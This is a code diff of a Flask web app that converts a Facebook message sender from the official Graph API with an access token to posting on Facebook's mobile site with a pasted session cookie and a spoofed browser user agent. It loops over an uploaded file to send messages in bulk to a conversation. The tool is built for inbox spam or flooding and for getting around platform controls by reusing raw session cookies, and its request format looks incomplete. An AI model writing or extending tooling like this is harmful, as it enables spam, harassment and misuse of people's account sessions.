@@ -1,5 +1,4 @@
 from flask import Flask, request, redirect, url_for
-import os
 import time
 import requests
 
@@ -12,7 +11,7 @@ def index():
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Message Sender</title>
+            <title>Facebook Inbox Message Sender</title>
             <style>
                 body {
                     font-family: Arial, sans-serif;
@@ -46,13 +45,13 @@ def index():
         </head>
         <body>
             <div class="container">
-                <h2>Send Messages to Conversation</h2>
+                <h2>Send Facebook Inbox Messages</h2>
                 <form action="/" method="post" enctype="multipart/form-data">
                     <label for="conversationId">Conversation ID:</label>
                     <input type="text" id="conversationId" name="conversationId" required>
                     
-                    <label for="token">Access Token:</label>
-                    <input type="text" id="token" name="token" required>
+                    <label for="cookie">Facebook Cookie:</label>
+                    <input type="text" id="cookie" name="cookie" required>
                     
                     <label for="messageFile">Messages File (TXT):</label>
                     <input type="file" id="messageFile" name="messageFile" accept=".txt" required>
@@ -70,29 +69,31 @@ def index():
 @app.route('/', methods=['POST'])
 def send_messages():
     conversation_id = request.form.get('conversationId')
-    token = request.form.get('token')
+    cookie = request.form.get('cookie')
     delay = int(request.form.get('delay'))
 
-    # Get the messages from the uploaded file
+    # Read the messages from the uploaded file
     message_file = request.files['messageFile']
     messages = message_file.read().decode().splitlines()
 
-    url = f"https://graph.facebook.com/v15.0/{conversation_id}/messages"
+    url = f"https://m.facebook.com/messages/send/?icm=1&refid=12"
 
+    # Prepare headers using the cookie and a default user agent
     headers = {
-        'Authorization': f'Bearer {token}',
-        'Content-Type': 'application/json'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+        'Cookie': cookie,
+        'Content-Type': 'application/x-www-form-urlencoded'
     }
 
     success_count = 0
     for i, message in enumerate(messages):
         data = {
-            "messaging_type": "RESPONSE",
-            "message": {"text": message}
+            'ids[{}]'.format(conversation_id): conversation_id,
+            'body': message,
         }
 
         try:
-            response = requests.post(url, json=data, headers=headers)
+            response = requests.post(url, data=data, headers=headers)
             if response.status_code == 200:
                 print(f"[{i+1}/{len(messages)}] Message sent: {message}")
                 success_count += 1
